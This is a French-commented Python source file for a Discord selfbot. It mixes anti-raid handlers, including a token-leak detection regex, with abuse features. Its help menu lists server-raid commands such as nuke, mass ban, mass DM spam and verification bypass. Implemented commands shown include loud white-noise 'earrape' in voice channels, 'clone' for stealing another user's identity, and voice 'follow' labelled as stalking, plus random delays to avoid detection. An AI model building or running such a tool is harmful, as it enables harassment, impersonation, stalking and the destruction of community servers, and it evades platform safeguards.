import asyncio
import threading
import collections
import time
import random
import string
import re
import sys
import logging
import os
import shutil
import subprocess
import json
from datetime import datetime, timedelta
from typing import Optional, List

try:
    import yt_dlp
except ImportError:
    yt_dlp = None

# GUI tools disabled for server environment
tk = None

import discord
from discord.ext import commands
import aiohttp

# ──────────────────────────────────────────────────────────────────────────────
#                          CONFIGURATION GLOBALE
# ──────────────────────────────────────────────────────────────────────────────

CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "prefix": ".",
    "auto_delete_commands": True,
    "rotate_status_delay": 5,
    "autofarm_delay": 60,
    "whitelist": []
}

def load_config():
    # In server environment, config might be read-only or ephemeral
    try:
        if not os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'w') as f:
                    json.dump(DEFAULT_CONFIG, f, indent=4)
            except IOError:
                pass # Cannot write, just return default
            return DEFAULT_CONFIG.copy()
        
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return DEFAULT_CONFIG.copy()

def save_config(config):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    except IOError:
        print("Warning: Could not save config (read-only filesystem?)")

CONFIG = load_config()

# Préfixes pour les commandes
PREFIXES = [CONFIG.get("prefix", ".")]

# Token (sera demandé au lancement)
TOKEN = None

# Configuration Anti-Raid (modules activables/désactivables)
ANTIRAID_MODULES = {
    "antispam": False,           # Anti-spam rapide
    "antimassmention": False,    # Anti-mass mentions
    "antichannelcreate": False,  # Anti-création de salons
    "antichanneldelete": False,  # Anti-suppression de salons
    "antirolecreate": False,     # Anti-création de rôles
    "antiroledelete": False,     # Anti-suppression de rôles
    "antibotjoin": False,        # Anti-ajout de bots
    "antiban": False,            # Anti-ban non autorisé
    "antiunban": False,          # Anti-unban non autorisé
    "antikick": False,           # Anti-kick non autorisé
    "antiwebhook": False,        # Anti-création de webhooks
    "antiupdate": False,         # Anti-modification du serveur
    "antieveryone": False,       # Anti-@everyone/@here
    "antilink": False,           # Anti-liens
    "antitoken": False,          # Anti-leak de tokens
    "antirank": False,           # Anti-ajout de rôles admin
    "protected": False,          # Protection globale
}

# Whitelist des utilisateurs protégés (IDs)
# On charge depuis la config si existant
WHITELIST: set[int] = set(CONFIG.get("whitelist", []))

# Cache pour anti-spam (par user ID)
spam_cache: collections.defaultdict = collections.defaultdict(list)

# Stockage pour le clone/unclone
original_profile = {}

# Stockage pour l'autofarm
autofarm_tasks = {}

# Stockage pour le suivi vocal
voice_follow_target: Optional[int] = None

# Stockage pour le mode perroquet
parrot_target_id: Optional[int] = None

# Tâche pour le statut rotatif
rotate_status_task = None

# Variable globale pour l'arrêt d'urgence des boucles (spam, raid, massban...)
stop_requested: bool = False

# Logging setup
try:
    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )
    # Try adding file handler, but don't fail if it doesn't work
    try:
        file_handler = logging.FileHandler("selfbot.log")
        file_handler.setFormatter(logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s"))
        logging.getLogger().addHandler(file_handler)
    except IOError:
        pass
except Exception as e:
    print(f"Logging setup failed: {e}")

logger = logging.getLogger("selfbot")

# ──────────────────────────────────────────────────────────────────────────────
#                               SETUP DU BOT
# ──────────────────────────────────────────────────────────────────────────────

# Intents are not required for discord.py-self 2.0+
# intents = discord.Intents.default()
# intents.members = True
# intents.message_content = True
# intents.guilds = True
# intents.bans = True
# intents.webhooks = True
# intents.presences = False

# Bot setup (self_bot=True pour discord.py-self)
try:
    bot = commands.Bot(
        command_prefix=PREFIXES,
        self_bot=True,
        # intents=intents,  # Removed for discord.py-self compatibility
        case_insensitive=True,
        help_command=None # Désactiver l'aide par défaut
    )
except Exception:
    # Fallback si discord.py-self non installé (standard discord.py requires intents)
    # Re-enable intents locally if needed for standard discord.py
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(
        command_prefix=PREFIXES,
        intents=intents,
        self_bot=False, # Si on est ici, c'est probablement pas selfbot lib
        case_insensitive=True,
        help_command=None
    )

# Supprimer la commande help par défaut
bot.remove_command("help")

# ──────────────────────────────────────────────────────────────────────────────
#                            FONCTIONS UTILITAIRES
# ──────────────────────────────────────────────────────────────────────────────

def random_string(length: int = 10) -> str:
    """Génère une chaîne aléatoire pour noms, etc."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_delay(min_sec: float = 0.5, max_sec: float = 2.0) -> float:
    """Délai aléatoire pour éviter rate-limits et détection."""
    return random.uniform(min_sec, max_sec)

async def safe_send(channel: discord.abc.Messageable, content: str, delete_after: Optional[float] = None):
    """Envoie un message en toute sécurité."""
    try:
        return await channel.send(content, delete_after=delete_after)
    except discord.Forbidden:
        logger.warning(f"Permissions insuffisantes pour envoyer dans {channel}")
    except discord.HTTPException as e:
        logger.error(f"Erreur envoi message: {e}")
    return None

async def safe_delete(message: discord.Message):
    """Supprime un message en toute sécurité."""
    if not CONFIG.get("auto_delete_commands", True):
        return
    try:
        await message.delete()
    except discord.NotFound:
        pass
    except discord.Forbidden:
        logger.warning(f"Permissions insuffisantes pour supprimer {message.id}")
    except discord.HTTPException as e:
        logger.error(f"Erreur suppression message: {e}")

async def punish_user(guild: discord.Guild, user: discord.Member, reason: str = "Violation Anti-Raid"):
    """Punit un utilisateur: derank ou ban."""
    if user.id == bot.user.id or user.id in WHITELIST:
        logger.info(f"Utilisateur protégé: {user} - Ignoré pour {reason}")
        return

    logger.warning(f"Punition de {user} pour {reason}")

    try:
        # Retirer les rôles (derank)
        roles_to_remove = [role for role in user.roles if role != guild.default_role and role < guild.me.top_role]
        if roles_to_remove:
            await user.remove_roles(*roles_to_remove, reason=reason)
            logger.info(f"Rôles supprimés pour {user}")
            return

        # Si derank échoue, ban
        await guild.ban(user, reason=reason, delete_message_days=1)
        logger.info(f"{user} banni pour {reason}")
    except discord.Forbidden:
        logger.error(f"Permissions insuffisantes pour punir {user}")
    except discord.HTTPException as e:
        logger.error(f"Erreur punition {user}: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                           ÉVÉNEMENTS ANTI-RAID
# ──────────────────────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    """Événement quand le bot est prêt."""
    logger.info(f"Self-Bot connecté comme {bot.user} (ID: {bot.user.id})")
    
    # Force le préfixe depuis la config pour être sûr
    current_prefix = CONFIG.get("prefix", ".")
    bot.command_prefix = [current_prefix]
    logger.info(f"Préfixe actif: {current_prefix}")
    
    logger.info(f"Guilds connectés: {len(bot.guilds)}")
    # Pas de changement de statut automatique (reste en ligne ou reprend le statut du client)

@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    """Gestion des erreurs de commandes."""
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"❌ Erreur commande: {error}") # Debug
    logger.error(f"Erreur commande {ctx.command}: {error}")
    if isinstance(error, commands.MissingRequiredArgument):
        await safe_send(ctx.channel, f"Argument manquant: {error.param.name}", delete_after=5)
        return
    if isinstance(error, commands.BadArgument):
        await safe_send(ctx.channel, "Argument invalide.", delete_after=5)
        return
    logger.error(f"Erreur commande '{ctx.command}': {error}")
    await safe_send(ctx.channel, f"Erreur: {str(error)}", delete_after=10)

@bot.event
async def on_message(message: discord.Message):
    """Événement sur chaque message pour anti-raid et process commands."""
    
    # 1. Vérification stricte de l'auteur (Selfbot uniquement)
    if message.author.id != bot.user.id:
        return

    # 2. Debug explicite pour voir ce que le bot reçoit
    if message.content.startswith('.'):
        print(f"[Debug] Message reçu: '{message.content}' dans {message.channel}")
        # DEBUG VISIBLE SUR DISCORD
        # await safe_send(message.channel, f"🔍 DEBUG: J'ai vu le message `{message.content}`", delete_after=5)

    # 2.5 Mode Perroquet
    if parrot_target_id and message.author.id == parrot_target_id and not message.author.bot:
        try:
            # On répète le message
            if message.content:
                await safe_send(message.channel, message.content)
            # On répète les pièces jointes si possible (url uniquement pour selfbot simple)
            for attachment in message.attachments:
                await safe_send(message.channel, attachment.url)
        except Exception as e:
            print(f"[Parrot] Erreur: {e}")

    # 3. Tentative d'exécution manuelle si process_commands échoue
    if message.content.startswith(".follow"):
        try:
            await safe_send(message.channel, "✅ DEBUG: Commande .follow détectée!", delete_after=5)
            
            # Extraction des arguments à la main
            # On gère le cas avec ou sans espace
            args = message.content[len(".follow"):].strip()
            
            await safe_send(message.channel, f"DEBUG: Args = '{args}'", delete_after=5)

            if args:
                # Appel direct de la fonction sous-jacente
                ctx = await bot.get_context(message)
                # On bypass le système de commande et on appelle la callback directement si possible
                # Ou on invoque via ctx.invoke
                cmd = bot.get_command('follow')
                if cmd:
                    await ctx.invoke(cmd, user_arg=args)
                else:
                    await safe_send(message.channel, "❌ CRITICAL: Commande 'follow' non trouvée dans le bot!", delete_after=10)
                return
            else:
                 await safe_send(message.channel, "❌ Manque l'ID après .follow", delete_after=5)
        except Exception as e:
            print(f"[Debug] Erreur appel manuel follow: {e}")
            import traceback
            traceback.print_exc()
            await safe_send(message.channel, f"🔥 CRITICAL ERROR: {e}", delete_after=10)

    # 4. Traitement standard
    # Fallback manuel pour les commandes critiques si process_commands échoue
    prefix = CONFIG.get("prefix", ".")
    
    # Commande de debug absolue (fonctionne toujours avec .ping)
    if message.content == ".ping":
        await safe_send(message.channel, "🏓 Pong! (Mode Secours Actif)", delete_after=5)
        return

    if message.content == f"{prefix}toggledelete":
        try:
             CONFIG["auto_delete_commands"] = not CONFIG.get("auto_delete_commands", True)
             save_config(CONFIG)
             state = "activée" if CONFIG["auto_delete_commands"] else "désactivée"
             await safe_send(message.channel, f"🗑️ Auto-delete: **{state}**", delete_after=5)
             await safe_delete(message)
             return
        except Exception as e:
             print(f"Error in manual toggledelete: {e}")

    try:
        await bot.process_commands(message)
    except Exception as e:
        print(f"Error processing commands: {e}")

    if not message.guild:
        return

    # Anti-Raid Checks (si activé)
    if message.author.id in WHITELIST:
        return

    now = time.time()

    # Anti-Spam
    if ANTIRAID_MODULES["antispam"]:
        bucket = spam_cache[message.author.id]
        bucket = [t for t in bucket if now - t < 5]
        bucket.append(now)
        spam_cache[message.author.id] = bucket
        if len(bucket) > 8:
            await punish_user(message.guild, message.author, "Spam détecté")
            await safe_delete(message)
            return

    # Anti-Mass Mention
    if ANTIRAID_MODULES["antimassmention"]:
        mentions_count = len(message.mentions) + len(message.role_mentions)
        if mentions_count > 5:
            await punish_user(message.guild, message.author, "Mass mention")
            await safe_delete(message)
            return

    # Anti-Everyone/Here
    if ANTIRAID_MODULES["antieveryone"]:
        if "@everyone" in message.content.lower() or "@here" in message.content.lower():
            await punish_user(message.guild, message.author, "Mention everyone/here interdite")
            await safe_delete(message)
            return

    # Anti-Link
    if ANTIRAID_MODULES["antilink"]:
        if re.search(r"(http|https)://", message.content, re.IGNORECASE):
            await punish_user(message.guild, message.author, "Lien interdit")
            await safe_delete(message)
            return

    # Anti-Token Leak
    if ANTIRAID_MODULES["antitoken"]:
        token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}"
        if re.search(token_pattern, message.content):
            await punish_user(message.guild, message.author, "Leak de token détecté")
            await safe_delete(message)
            return

    await bot.process_commands(message)

@bot.event
async def on_member_join(member: discord.Member):
    """Anti-Bot Join."""
    if ANTIRAID_MODULES["antibotjoin"] and member.bot:
        await punish_user(member.guild, member, "Ajout de bot non autorisé")

@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel):
    """Anti-Channel Create."""
    if not ANTIRAID_MODULES["antichannelcreate"]:
        return
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(channel.guild, entry.user)
            await channel.delete(reason="Anti-Raid: Création non autorisée")

@bot.event
async def on_guild_channel_delete(channel: discord.abc.GuildChannel):
    """Anti-Channel Delete."""
    if not ANTIRAID_MODULES["antichanneldelete"]:
        return
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(channel.guild, entry.user, "Suppression de salon non autorisée")

@bot.event
async def on_guild_role_create(role: discord.Role):
    """Anti-Role Create."""
    if not ANTIRAID_MODULES["antirolecreate"]:
        return
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_create):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(role.guild, entry.user, "Création de rôle non autorisée")
            await role.delete(reason="Anti-Raid")

@bot.event
async def on_guild_role_delete(role: discord.Role):
    """Anti-Role Delete."""
    if not ANTIRAID_MODULES["antiroledelete"]:
        return
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(role.guild, entry.user, "Suppression de rôle non autorisée")

@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    """Anti-Ban."""
    if not ANTIRAID_MODULES["antiban"]:
        return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(guild, entry.user, "Ban non autorisé")
            try:
                await guild.unban(user, reason="Anti-Raid: Rollback")
            except discord.Forbidden:
                logger.warning("Impossible de unban (permissions)")

@bot.event
async def on_member_unban(guild: discord.Guild, user: discord.User):
    """Anti-Unban."""
    if not ANTIRAID_MODULES["antiunban"]:
        return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.unban):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(guild, entry.user, "Unban non autorisé")
            await guild.ban(user, reason="Anti-Raid: Rollback")

@bot.event
async def on_member_remove(member: discord.Member):
    """Anti-Kick (via remove)."""
    if not ANTIRAID_MODULES["antikick"]:
        return
    async for entry in member.guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(member.guild, entry.user, "Kick non autorisé")

@bot.event
async def on_webhooks_update(channel: discord.abc.GuildChannel):
    """Anti-Webhook."""
    if not ANTIRAID_MODULES["antiwebhook"]:
        return
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(channel.guild, entry.user, "Création de webhook non autorisée")
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                if webhook.user == entry.user:
                    await webhook.delete(reason="Anti-Raid")

@bot.event
async def on_guild_update(before: discord.Guild, after: discord.Guild):
    """Anti-Update Guild."""
    if not ANTIRAID_MODULES["antiupdate"]:
        return
    async for entry in after.audit_logs(limit=1, action=discord.AuditLogAction.guild_update):
        if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
            await punish_user(after, entry.user, "Modification du serveur non autorisée")
            # Rollback simple (ex: nom)
            if before.name != after.name:
                await after.edit(name=before.name, reason="Anti-Raid Rollback")

@bot.event
async def on_member_update(before: discord.Member, after: discord.Member):
    """Anti-Rank (ajout de rôles suspects)."""
    if not ANTIRAID_MODULES["antirank"]:
        return
    if len(before.roles) < len(after.roles):
        added_roles = [r for r in after.roles if r not in before.roles]
        if any(role.permissions.administrator or role.permissions.manage_guild for role in added_roles):
            async for entry in after.guild.audit_logs(limit=1, action=discord.AuditLogAction.member_role_update):
                if entry.user.id != bot.user.id and entry.user.id not in WHITELIST:
                    await punish_user(after.guild, entry.user, "Ajout de rôle admin suspect")
                    await after.remove_roles(*added_roles, reason="Anti-Raid Rollback")

@bot.event
async def on_voice_state_update(member: discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    """Suivi vocal automatique."""
    global voice_follow_target
    
    # Si le suivi n'est pas activé ou si ce n'est pas la cible
    if not voice_follow_target or member.id != voice_follow_target:
        return
    
    # Si c'est le bot lui-même, on ignore
    if member.id == bot.user.id:
        return

    guild = member.guild
    print(f"[Follow] Event triggered for {member} in {guild.name} (Ch: {after.channel})") # Debug console

    # Si la cible quitte le vocal
    if after.channel is None:
        logger.info(f"[Follow] Cible {member} a quitté le vocal dans {guild.name}.")
        print(f"[Follow] Target left voice in {guild.name}")
        if guild.voice_client and guild.voice_client.is_connected():
            await guild.voice_client.disconnect()
        return

    # Si la cible rejoint ou change de salon
    if after.channel != before.channel:
        logger.info(f"[Follow] Cible {member} a bougé vers {after.channel.name} dans {guild.name}.")
        print(f"[Follow] Target moved to {after.channel.name}")
        try:
            # On vérifie si le bot est déjà connecté
            if guild.voice_client:
                # Si déjà dans le même salon, rien à faire
                if guild.voice_client.channel == after.channel:
                    return
                
                # Tente de bouger
                try:
                    await guild.voice_client.move_to(after.channel)
                except Exception as move_error:
                    print(f"[Follow] Move failed, trying reconnect: {move_error}")
                    # Fallback: Disconnect and Connect
                    await guild.voice_client.disconnect(force=True)
                    await asyncio.sleep(0.5)
                    await after.channel.connect(self_deaf=True, timeout=20, reconnect=True)

            else:
                await after.channel.connect(self_deaf=True, timeout=20, reconnect=True)
        except Exception as e:
            logger.error(f"[Follow] Erreur suivi vocal sur {guild.name}: {e}")
            print(f"[Follow] Critical error: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                               COMMANDES
# ──────────────────────────────────────────────────────────────────────────────

@bot.command()
async def setprefix(ctx: commands.Context, new_prefix: str):
    """Change le préfixe du bot."""
    await safe_delete(ctx.message)
    CONFIG["prefix"] = new_prefix
    save_config(CONFIG)
    bot.command_prefix = [new_prefix]
    await safe_send(ctx.channel, f"✅ Nouveau préfixe: `{new_prefix}`", delete_after=5)

@bot.command()
async def toggledelete(ctx: commands.Context):
    """Active/Désactive la suppression auto des commandes."""
    await safe_delete(ctx.message)
    CONFIG["auto_delete_commands"] = not CONFIG.get("auto_delete_commands", True)
    save_config(CONFIG)
    state = "activée" if CONFIG["auto_delete_commands"] else "désactivée"
    await safe_send(ctx.channel, f"🗑️ Auto-delete: **{state}**", delete_after=5)

@bot.command()
async def rotatestatus(ctx: commands.Context, *, text: str):
    """
    Fait défiler plusieurs statuts en boucle.
    Séparez les statuts par " | ".
    Ex: .rotatestatus Gaming | Sleeping | Coding
    """
    await safe_delete(ctx.message)
    global rotate_status_task
    
    if rotate_status_task:
        rotate_status_task.cancel()
    
    statuses = [s.strip() for s in text.split("|")]
    
    async def loop_status():
        while True:
            for status in statuses:
                try:
                    await bot.change_presence(activity=discord.Game(name=status))
                    await asyncio.sleep(CONFIG.get("rotate_status_delay", 5))
                except:
                    pass
    
    rotate_status_task = asyncio.create_task(loop_status())
    await safe_send(ctx.channel, f"🔄 Rotation de {len(statuses)} statuts activée.", delete_after=5)

@bot.command()
async def stopstatus(ctx: commands.Context):
    """Arrête la rotation de statut."""
    await safe_delete(ctx.message)
    global rotate_status_task
    if rotate_status_task:
        rotate_status_task.cancel()
        rotate_status_task = None
        await bot.change_presence(activity=None)
        await safe_send(ctx.channel, "⏹️ Statut arrêté.", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Pas de rotation en cours.", delete_after=5)

@bot.command()
async def stop(ctx: commands.Context):
    """Arrêt d'urgence de toutes les boucles (spam, raid, massban...)."""
    global stop_requested
    await safe_delete(ctx.message)
    stop_requested = True
    await safe_send(ctx.channel, "🛑 Arrêt d'urgence demandé... (Wait 3s)", delete_after=5)
    await asyncio.sleep(3)
    stop_requested = False

@bot.command()
async def stopparrot(ctx: commands.Context):
    """Arrête le mode Perroquet."""
    global parrot_target_id
    await safe_delete(ctx.message)
    parrot_target_id = None
    await safe_send(ctx.channel, "🦜 Mode Perroquet arrêté.", delete_after=5)

@bot.command()
async def stopfarm(ctx: commands.Context, channel_id: int = None):
    """Arrête l'autofarm (tout ou salon spécifique)."""
    await safe_delete(ctx.message)
    global autofarm_tasks
    
    if channel_id:
        key = f"farm_{channel_id}"
        if key in autofarm_tasks:
            autofarm_tasks[key].cancel()
            del autofarm_tasks[key]
            await safe_send(ctx.channel, f"🛑 Autofarm arrêté dans <#{channel_id}>.", delete_after=5)
        else:
            await safe_send(ctx.channel, "❌ Pas d'autofarm dans ce salon.", delete_after=5)
    else:
        count = len(autofarm_tasks)
        for task in autofarm_tasks.values():
            task.cancel()
        autofarm_tasks.clear()
        await safe_send(ctx.channel, f"🛑 Tous les autofarms arrêtés ({count}).", delete_after=5)

@bot.command(name="help", aliases=["aide", "commands", "cmds"])
async def help_command(ctx: commands.Context, category: Optional[str] = None):
    """Affiche l'aide des commandes."""
    await safe_delete(ctx.message)

    help_categories = {
        "general": {
            "title": "Général / Utiles",
            "icon": "🛠️",
            "cmds": [
                ".ping - Vérifie la latence",
                ".stop - ARRÊT D'URGENCE (Spam, Raid, etc.)",
                ".stopparrot - Arrête le mode Perroquet",
                ".stopfarm [id] - Arrête l'autofarm",
                ".tokeninfo - Infos du token/compte",
                ".guildicon - Icône du serveur",
                ".firstmessage - Lien du premier message du salon",
                ".dhikr - Phrase de dhikr aléatoire",
                ".clearmydms - Supprime tous vos messages en MP"
            ]
        },
        "raid": {
            "title": "Raid / Destruction",
            "icon": "☣️",
            "cmds": [
                ".nuke [nom] [nb] [msg] - Détruit tout + recrée salons/spam",
                ".raid <nb> <msg> - Mass ping + delete channels",
                ".masschannel <nb> <nom> [msg] - Crée salons + spam dedans",
                ".parrot <@user> - Répète les messages de la cible",
                ".spam <nb> <msg> - Spam dans le salon",
                ".spamid <user_id> <nb> <msg> - Spam MP à un user",
                ".spamall <nb> <msg> - Spam MP à tous les membres",
                ".massdm <msg> - DM unique à tous",
                ".webhookspam <url> <nb> <msg> - Spam via webhook",
                ".everyone <nb> [msg] - Spam @everyone",
                ".here <nb> [msg] - Spam @here",
                ".scramble - Renomme salons aléatoirement",
                ".autoguild <nom> <nb> - Crée plusieurs serveurs",
                ".massnick <base> - Change nick de tous aléatoirement",
                ".massban - Ban tous les membres (sauf whitelist)",
                ".masskick - Kick tous les membres possibles",
                ".massrole <action> <nb> [nom] - Crée/Supprime rôles"
            ]
        },
        "antiraid": {
            "title": "Anti-Raid / Protection",
            "icon": "🛡️",
            "cmds": [
                ".antiraid - Affiche la liste et l'état des modules",
                ".antiraid <module> <on/off> - Active/Désactive un module",
                ".whitelist <@user> - Ajoute à la whitelist",
                ".unwhitelist <@user> - Retire de la whitelist"
            ]
        },
        "moderation": {
            "title": "Modération / Nettoyage",
            "icon": "🧹",
            "cmds": [
                ".purge <nb> - Supprime nb messages",
                ".delall - Supprime vos messages dans le salon",
                ".deluser <@user> - Supprime messages d'un user",
                ".cleardm <user_id> - Nettoie DM avec un user"
            ]
        },
        "vocal": {
            "title": "Vocal / Suivi",
            "icon": "🔊",
            "cmds": [
                ".joinvc - Rejoint votre salon",
                ".leavevc - Quitte le salon",
                ".follow <@user> - Suit un utilisateur (Stalk)",
                ".stopfollow - Arrête le suivi",
                ".play <url> - Joue un audio (YT/SC)",
                ".stop - Arrête la lecture",
                ".earrape - Détruit les oreilles",
                ".stopearrape - Arrête le massacre",
                ".vcping - Latence vocale"
            ]
        },
        "troll": {
            "title": "Troll / Fun",
            "icon": "🤡",
            "cmds": [
                ".parrot <@user> - Répète tout (Mode Perroquet)",
                ".stopparrot - Arrête le mode Perroquet",
                ".stream <texte> - Statut Streaming",
                ".earrape - Détruit les oreilles en vocal",
                ".clone <@user> - Copie le profil",
                ".unclone - Restaure le profil",
                ".autofarm <channel> <delay> - XP Farming",
                ".stopfarm [channel] - Arrête l'autofarm",
                ".whois <@user> - Infos utilisateur",
                ".ghostping <nb> <@user> - Mentions qui se suppriment",
                ".reactspam <msg_id> <emoji> <nb> - Spam réactions",
                ".nickspam <nb> - Spam changement de nick",
                ".statusspam <nb> <text> - Spam statut",
                ".massreact <nb> <emoji> - Réagit aux derniers messages",
                ".stealall - Vole tous les emojis du serveur",
                ".faketyping <sec> - Simule écriture"
            ]
        },
        "advanced": {
            "title": "Avancé / Outils",
            "icon": "🔧",
            "cmds": [
                ".restart - Redémarre le bot",
                ".update - Met à jour le code et redémarre",
                ".copyguild <guild_id> - Copie structure d'un serveur",
                ".dmhistory <user_id> <limit> - Historique DM",
                ".tokencheck - Vérifie validité token",
                ".bypassverify <invite> - Rejoint en bypassant vérif",
                ".leaveall [confirm] - Quitte tous les serveurs (sauf whitelist)"
            ]
        }
    }

    if category == "all":
        all_cmds = []
        for data in help_categories.values():
            all_cmds.append(f"[{data['icon']} {data['title']}]")
            all_cmds.extend(data['cmds'])
            all_cmds.append("")
        
        content = "```ini\n" + "\n".join(all_cmds) + "\n```"
        await safe_send(ctx.channel, content, delete_after=60)
        return

    if not category:
        menu = []
        for key, data in help_categories.items():
            menu.append(f"{data['icon']} {data['title']} - .help {key}")
        
        content = "```ini\n[ Menu d'Aide ]\n" + "\n".join(menu) + "\n\n[Info] .help all pour tout voir\n```"
        await safe_send(ctx.channel, content, delete_after=60)
        return

    cat_key = category.lower()
    if cat_key in help_categories:
        data = help_categories[cat_key]
        content = f"```ini\n[{data['icon']} {data['title']}]\n" + "\n".join(data['cmds']) + "\n```"
        await safe_send(ctx.channel, content, delete_after=60)
    else:
        await safe_send(ctx.channel, "Catégorie inconnue. Faites .help pour le menu.", delete_after=10)

@bot.command()
async def ping(ctx: commands.Context):
    """Vérifie la latence."""
    await safe_delete(ctx.message)
    latency = round(bot.latency * 1000)
    await safe_send(ctx.channel, f"🏓 Pong! Latence: {latency}ms", delete_after=5)

@bot.command()
async def stream(ctx: commands.Context, *, text: str):
    """Change le statut en Streaming."""
    await safe_delete(ctx.message)
    try:
        logger.info(f"Activation Stream: {text}")
        # Méthode 1: discord.Streaming
        # activity = discord.Streaming(name=text, url="https://twitch.tv/monstercat")
        
        # Méthode 2: discord.Activity (plus robuste sur selfbots parfois)
        activity = discord.Activity(type=discord.ActivityType.streaming, name=text, url="https://twitch.tv/monstercat")
        
        await bot.change_presence(activity=activity, status=discord.Status.dnd)
        
        msg = (
            f"🟣 Statut Streaming activé: **{text}**\n"
            "⚠️ **Note:** Si cela ne s'affiche pas, vérifiez vos **Paramètres Utilisateur > Confidentialité de l'activité** et activez 'Afficher l'activité en cours...'.\n"
            "Si vous êtes connecté ailleurs, le client officiel peut écraser ce statut."
        )
        await safe_send(ctx.channel, msg, delete_after=15)
    except Exception as e:
        logger.error(f"Erreur Stream: {e}")
        await safe_send(ctx.channel, f"❌ Erreur Stream: {e}", delete_after=10)

@bot.command()
async def stopstream(ctx: commands.Context):
    """Arrête le statut Streaming."""
    await safe_delete(ctx.message)
    try:
        await bot.change_presence(activity=None, status=discord.Status.online)
        await safe_send(ctx.channel, "⚪ Statut normal rétabli.", delete_after=5)
    except Exception as e:
        await safe_send(ctx.channel, f"❌ Erreur StopStream: {e}", delete_after=10)

@bot.command()
async def earrape(ctx: commands.Context):
    """Rejoint le vocal et détruit les oreilles."""
    await safe_delete(ctx.message)
    if not ctx.guild:
        return
    
    if not ctx.author.voice:
        await safe_send(ctx.channel, "❌ Tu n'es pas en vocal.", delete_after=5)
        return

    try:
        vc = await ctx.author.voice.channel.connect()
    except discord.ClientException:
        # Déjà connecté
        vc = ctx.guild.voice_client
    
    # URL d'un son earrape (exemple générique ou bruit blanc via ffmpeg)
    # On utilise ffmpeg pour générer du bruit très fort si pas de fichier
    # "anoisesrc=a=0.5:c=white:d=10" -> Bruit blanc 10 secondes
    # volume=100 -> Volume max
    
    ffmpeg_options = {
        'options': '-vn',
        "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5"
    }
    
    # On tente de jouer un son fort généré
    # Si ffmpeg n'est pas là, ça va fail, mais c'est géré par le try/except global du bot normalement
    try:
        # Source bruit blanc violent
        # On spécifie executable="./ffmpeg.exe" au cas où il n'est pas dans le PATH
        executable_path = "ffmpeg.exe" if os.path.exists("ffmpeg.exe") else "ffmpeg"
        
        source = discord.FFmpegPCMAudio(
            "anoisesrc=a=1:c=white:d=10",
            before_options="-f lavfi", # Input format lavfi pour le générateur
            options="-af volume=50", # Volume boost
            executable=executable_path
        )
        vc.play(source)
        await safe_send(ctx.channel, "🔊 RIP les oreilles...", delete_after=5)
        
        while vc.is_playing():
            await asyncio.sleep(1)
        
        if vc.is_connected():
            await vc.disconnect()
        
    except Exception as e:
        await safe_send(ctx.channel, f"❌ Erreur Audio: {e}", delete_after=10)
        if vc.is_connected():
            await vc.disconnect()

@bot.command()
async def stopearrape(ctx: commands.Context):
    """Arrête le earrape et quitte le vocal."""
    await safe_delete(ctx.message)
    if not ctx.guild:
        return
    
    vc = ctx.guild.voice_client
    if vc and vc.is_connected():
        if vc.is_playing():
            vc.stop()
        await vc.disconnect()
        await safe_send(ctx.channel, "🔇 Silence rétabli.", delete_after=5)
    else:
        await safe_send(ctx.channel, "❌ Je ne suis pas connecté en vocal.", delete_after=5)

@bot.command()
async def clone(ctx: commands.Context, user: discord.User, password: str = None):
    """Copie le profil d'un utilisateur. Usage: .clone @user [password]"""
    await safe_delete(ctx.message)
    
    # Sauvegarde du profil actuel
    global original_profile
    if not original_profile:
        original_profile = {
            "name": bot.user.name,
            "avatar": await bot.user.avatar.read() if bot.user.avatar else None
        }
    
    try:
        # Récupération avatar cible
        new_avatar = await user.avatar.read() if user.avatar else None
        
        # Application
        # Note: password requis pour changer username/avatar sur certains comptes sécurisés
        await bot.user.edit(username=user.name, avatar=new_avatar, password=password)
        await safe_send(ctx.channel, f"👤 Identité volée: **{user.name}**", delete_after=5)
    except Exception as e:
        if "password" in str(e).lower():
             await safe_send(ctx.channel, "❌ Mot de passe requis pour changer le profil. Usage: `.clone @user votre_mdp`", delete_after=10)
        else:
            await safe_send(ctx.channel, f"❌ Erreur Clone: {e}", delete_after=10)

@bot.command()
